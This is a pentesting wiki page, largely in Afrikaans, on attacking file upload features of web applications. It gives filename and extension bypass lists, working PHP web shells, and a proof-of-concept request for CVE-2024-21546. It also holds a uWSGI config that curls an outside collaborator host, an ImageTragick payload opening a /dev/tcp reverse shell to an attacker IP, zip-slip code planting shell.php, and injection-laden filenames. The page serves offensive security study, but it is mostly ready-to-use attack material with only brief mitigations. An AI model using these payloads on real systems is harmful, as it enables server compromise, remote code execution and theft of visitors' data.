# Lêeroplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil kontroles op lêeruitbreidings

1. As dit van toepassing is, **kontroleer** die **vorige extensies.** Toets hulle ook deur sommige **hoofdletters** te gebruik: _pHp, .pHP5, .PhAr ..._
2. _Kontroleer **om 'n geldige extensie voor** die uitvoeringsextensie by te voeg (gebruik ook die vorige extensies):_
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde** by te voeg. Jy kan Burp gebruik om alle **ascii** en **Unicode** karakters te **bruteforce**. (_Let wel dat jy ook die **vorige** genoemde **extensies** kan probeer._)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskermings te omseil deur die server-side **extension parser** te mislei met tegnieke soos **doubling** die **extension** of **adding junk** data (**null** bytes) tussen extensies. _Jy kan ook die **vorige extensies** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg **nog 'n laag extensies** by die vorige toets:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **exec extension voor die geldige extensie** te plaas en hoop dat die bediener verkeerd gekonfigureer is. (nuttig om Apache misconfigurasies uit te buit waar enigiets met die extensie .php, maar nie noodwendig eindigend in .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval sal 'n kolonkarakter ":" ingevoeg word na 'n verbode extensie en voor 'n toegelate een. As gevolg daarvan sal 'n **leë lêer met die verbode extensie** op die bediener geskep word (bv. "file.asax:.jpg”). Hierdie lêer kan later geredigeer word met ander tegnieke soos die gebruik van sy kort lêernaam. Die "**::$data**” patroon kan ook gebruik word om nie-leë lêers te skep. Daarom kan dit nuttig wees om 'n puntkarakter na hierdie patroon te voeg om verdere beperkings te omseil (bv. "file.asp::$data.”)
8. Probeer om die lêernaamlimiete te breek. Die geldige extensie word afgesny. En die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Sommige upload handlers sny of normaliseer puntkarakters aan die einde van die gestoorde lêernaam. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) weergawes voor 2.9.1 kan jy die extensie-validasie omseil deur:

- Deur 'n geldige image MIME en magic header te gebruik (bv. PNG se `\x89PNG\r\n\x1a\n`).
- Die opgelaaide lêer te noem met 'n PHP-extensie gevolg deur 'n punt, bv. `shell.php.`.
- Die bediener verwyder die agtervoegende punt en bewaar `shell.php`, wat sal uitvoer as dit in 'n web-aangewese gids geplaas word (standaard public storage soos `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigasies:
- Werk op unisharp/laravel-filemanager na ≥ 2.9.1.
- Dwing streng server-side allowlists af en valideer die gestoorde lêernaam weer.
- Bedien uploads vanaf nie-uitvoerbare liggings.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks deur die **value** van die **Content-Type** **header** te stel op: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check deur aan die begin van die lêer die **bytes van 'n werklike beeld** by te voeg (om die _file_ command te mislei). Of plaas die shell in die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
` ` of jy kan ook die **payload direk** in 'n beeld plaas:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- As **kompressie by jou beeld toegepas word**, byvoorbeeld deur sommige standaard PHP-biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan die **image** ook **resize**, byvoorbeeld met die PHP-GD funksies `imagecopyresized` of `imagecopyresampled`. Jy kan egter die **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog 'n tegniek om 'n payload te maak wat **'n beeld-hergrootting oorleef**, gebruik die PHP-GD funksie `thumbnailImage`. Jy kan egter die **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Vind 'n kwesbaarheid om die reeds opgelaaide lêer te **hernoem** (om die uitbreiding te verander).
- Vind 'n **Local File Inclusion** kwesbaarheid om die backdoor uit te voer.
- **Moontlike inligtingslek**:
1. Laai die **selfde lêer** **meermale** (en op die **selfde tyd**) op met dieselfde naam.
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **gids** wat **reeds bestaan**.
3. Laai 'n lêer op met **"." , "..", of "..." as sy naam**. Byvoorbeeld, in Apache op **Windows**, as die toepassing die opgelaaide lêers in "/www/uploads/" directory stoor, sal die "." lêernaam 'n lêer genaamd "uploads" in die "/www/" directory skep.
4. Laai 'n lêer op wat nie maklik verwyder kan word nie, soos **"...:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai 'n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Probeer ook om 'n **uitvoerbare lêer op te laai** (.exe) of 'n **.html** (minder verdag) wat **kode sal uitvoer** wanneer dit per ongeluk deur 'n slagoffer geopen word.

### Spesiale uitbreidings-trieke

As jy probeer om lêers na 'n **PHP server** op te laai, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
As jy probeer om lêers na 'n **ASP server** op te laai, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir java, maar vir php, en kan **soos 'n php-lêer gebruik word** (uitgevoer met php, of ingesluit in 'n script...).

Die `.inc` uitbreiding word soms gebruik vir php-lêers wat net gebruik word om **lêers te importeer**, so op 'n stadium kan iemand hierdie uitbreiding toegelaat het om **uitgevoer te word**.

## **Jetty RCE**

As jy 'n XML-lêer na 'n Jetty server kan oplaai, kan jy [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos in die volgende beeld vermeld, laai die XML-lêer na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Vir 'n gedetailleerde verkenning van hierdie kwesbaarheid, kyk na die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwetsbaarhede kan op uWSGI servers uitgebuit word as iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI-konfigurasielêers gebruik 'n spesifieke sintaks om "magic" veranderlikes, placeholders, en operateurs in te sluit. Besonder is die '@' operateur, gebruik as `@(filename)`, wat bedoel is om die inhoud van 'n lêer in te sluit. Onder die verskeie ondersteunde skemas in uWSGI is die "exec" skema besonder kragtig, omdat dit toelaat om data vanaf 'n proses se standaarduitset te lees. Hierdie funksie kan gemanipuleer word vir kwaadwillige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` konfigurasielêer verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini` lêer, wat verskeie skemas demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload gebeur tydens die parsing van die configuration file. Om die configuration te aktiveer en te parse, moet die uWSGI-proses óf herbegin word (moontlik na 'n crash of as gevolg van 'n Denial of Service attack) óf die lêer moet op auto-reload gestel word. Die auto-reload-funksie, indien aangeskakel, reload die lêer op gespesifiseerde intervalle wanneer veranderinge opgespoor word.

Dit is noodsaaklik om die los aard van uWSGI se configuration file parsing te verstaan. Spesifiek kan die genoemde payload in 'n binary file (soos 'n image of PDF) ingevoeg word, wat die omvang van potensiële exploitasiemoglikhede verder vergroot.

## **wget File Upload/SSRF Trick**

In sommige gevalle sal jy vind dat 'n server **`wget`** gebruik om **`download files`** en jy kan die **`URL`** aandui. In sulke gevalle mag die code kontroleer dat die uitbreiding van die gedownloade lêers op 'n whitelist is om te verseker dat slegs toegelate lêers gedownload word. However, `this check can be bypassed.`\
Die **maksimum** lengte van 'n **lêernaam** in **linux** is **255**, maar **wget** verkort die lêernaam tot **236** karakters. Jy kan **download a file called "A"\*232+".php"+".gif"**, hierdie lêernaam sal die **bypass** die **check** (soos in hierdie voorbeeld **".gif"** 'n **valid** uitbreiding is) maar `wget` sal die lêer **rename** na **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Noteer dat **'n ander opsie** waaraan jy dalk dink om hierdie kontrole te omseil, is om die **HTTP server na 'n ander lêer te herlei**, sodat die aanvanklike URL die kontrole omseil maar wget dan die herlei lêer met die nuwe naam sal aflaai. Dit **sal nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei bladsy met die naam van die lêer wat in die oorspronklike URL aangedui is, sal aflaai**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel ontwerp om Pentesters en Bug Hunters te help met die toets van file upload-meganismes. Dit maak gebruik van verskeie bug bounty techniques om die proses van die identifisering en benutting van vulnerabilities te vereenvoudig, en verseker deeglike assesserings van web applications.

### Corrupting upload indices with snprintf quirks (historical)

Sommige legacy upload handlers wat `snprintf()` of soortgelyke funksies gebruik om multi-file arrays uit 'n single-file upload te bou, kan mislei word om die `_FILES` struktuur te vervals. As gevolg van inkonsekwenthede en afkap in die gedrag van `snprintf()`, kan 'n noukeurig saamgestelde enkele upload aan die bedienerkant as verskeie geïndekseerde lêers voorkom, wat logika wat 'n streng vorm aanvaar in die war stuur (bv. dit as 'n multi-file upload beskou en onveilige takke volg). Al is dit vandag nis, duik hierdie “index corruption” patroon soms weer op in CTFs en ouer kodebasisse.

## Van lêeroplaai na ander kwesbaarhede

- Stel **filename** op `../../../tmp/lol.png` en probeer 'n **path traversal** bereik
- Stel **filename** op `sleep(10)-- -.jpg` en jy mag in staat wees om 'n **SQL injection** te bewerkstellig
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n **XSS** te bewerkstellig
- Stel **filename** op `; sleep 10;` om sekere command injection te toets (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probeer **different svg payloads** van [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- As jy die webserver kan opdrag gee om 'n image vanaf 'n URL te haal, kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/index.html) te misbruik. As hierdie **image** na 'n **public** webwerf gestoor gaan word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en sodoende **inligting van elke besoeker steel**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal samengestelde PDFs vir XSS: Die [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan oplaai, kan jy 'n PDF voorberei wat arbitraire JS sal uitvoer volgens die gegewe aanwysings.
- Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kontroleer of die bediener enige **antivirus** het
- Kontroleer of daar enige **size limit** is wanneer lêers opgelaai word

Hier is 'n top 10 lys van dinge wat jy deur oplaai kan bereik (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Verwys na [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander filetypes.

## Zip/Tar-lêer wat outomaties gedekomprimeer word tydens oplaai

As jy 'n ZIP kan oplaai wat op die bediener gedekomprimeer gaan word, kan jy twee dinge doen:

### Symlink

Laai 'n archive op wat soft links na ander lêers bevat; wanneer jy toegang kry tot die gedekomprimeerde lêers, sal jy toegang kry tot die gekoppelde lêers:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontpak in verskillende gidse

Die onverwagte skepping van lêers in gidse tydens uitpak is 'n beduidende probleem. Ondanks aanvanklike aannames dat hierdie opstelling moontlik teen OS-level command execution via malicious file uploads sal beskerm, kan die hiërargiese kompressie-ondersteuning en directory traversal vermoëns van die ZIP-argiefformaat misbruik word. Dit stel attackers in staat om beperkings te omseil en uit veilige upload directories te ontsnap deur die uitpakfunksionaliteit van die geteikende toepassing te manipuleer.

'n Geautomatiseerde exploit om sulke lêers te skep is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die utility kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink trick with evilarc** 'n opsie. As die doelwit is om 'n lêer soos `/flag.txt` te teiken, moet 'n symlink na daardie lêer in jou stelsel geskep word. Dit verseker dat evilarc nie foute teëkom tydens sy werking nie.

Hieronder is 'n voorbeeld van Python-kode wat gebruik word om 'n kwaadwillige zip-lêer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Vir verdere besonderhede **kyk na die oorspronklike pos by**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-kode word geskryf om opdragte uit te voer wat deur die `$_REQUEST`-veranderlike deurgegee word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Verskeie lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die name van die lêers binne die zip word met vi of 'n hex editor gewysig, deur "xxA" na "../" te verander om gidsstrukture te deurkruis.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laai hierdie inhoud op met 'n image-uitbreiding om die kwesbaarheid uit te buit **(ImageMagick, 7.0.1-1)** (vanaf die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van PHP Shell in PNG

Die insluiting van 'n PHP shell in die IDAT-chunk van 'n PNG-lêer kan effektief sekere beeldverwerkingsoperasies omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is besonder relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir die verander van grootte en herbemonstering van beelde. Die vermoë van die ingeslote PHP shell om ongeskonde te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gebruiksgevalle.

'n Gedetailleerde verkenning van hierdie tegniek, insluitend die metodologie en moontlike toepassings, word verskaf in die volgende artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie hulpbron bied 'n omvattende begrip van die proses en die implikasies daarvan.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files dien as 'n unieke hulpmiddel in cybersecurity, en tree op soos kameleons wat geldig in meerdere lêerformate terselfdertyd kan bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers beperk zich nie tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook uitvoerbaar.

Die kern nut van polyglot files lê in hul vermoë om sekuriteitstelsels te omseil wat lêers op grond van tipe sifting. Algemene praktyk in verskeie toepassings is om slegs sekere lêertipes vir upload toe te laat—soos JPEG, GIF, of DOC—om die risiko van potensieel gevaarlike formate (bv. JS, PHP of Phar lêers) te beperk. 'n Polyglot, deur te voldoen aan die strukturele kriteria van meerdere lêertipes, kan egter stilletjies hierdie beperkings omseil.

Ten spyte van hul aanpasbaarheid, het polyglots beperkings. Byvoorbeeld, terwyl 'n polyglot terselfdertyd 'n PHAR-lêer en 'n JPEG kan beliggaam, kan die sukses van die upload afhang van die platform se beleid oor lêeruitbreidings. As die stelsel streng is oor toelaatbare uitbreidings, mag die blote strukturele tweespalt van 'n polyglot nie voldoende wees om die upload te waarborg nie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Hoe om lêertipe-detektering te omseil deur 'n geldige JSON-lêer op te laai, selfs al is dit nie toegelaat nie, deur 'n PDF-lêer te faksimeer (tegnieke van **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmagic` library**: Solank die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (kry voorbeeld uit die post)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON by sodat die biblioteek dink dit is 'n pdf (kry voorbeeld uit die post)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep net 'n JSON wat groter is as dit sodat dit nie die inhoud as 'n json kan parse nie en sit dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dit is 'n PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
